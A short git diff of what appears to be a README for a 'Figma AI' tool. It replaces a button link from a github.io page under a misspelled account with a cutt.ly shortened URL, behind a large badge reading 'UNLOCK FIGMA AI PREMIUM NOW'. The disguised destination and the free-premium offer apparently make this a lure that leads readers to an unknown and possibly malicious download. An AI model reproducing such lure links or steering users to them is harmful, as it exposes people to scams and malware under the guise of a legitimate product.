@@ -64,7 +64,7 @@ One-click clean code export (React, SwiftUI, Tailwind)
 
 ---
 <div align="center">
-<a href="https://osx-aplications.github.io/.github/figma-ai-tools">
+<a href="https://cutt.ly/2tuwbmb3">
   <img src="https://img.shields.io/badge/UNLOCK FIGMA AI PREMIUM NOW-%236B4EFF?style=for-the-badge&logo=figma&logoColor=white&labelColor=1C1C1E&color=6B4EFF"
        height="84"
        style="border-radius:42px; box-shadow:0 16px 48px rgba(107,78,255,0.5);">
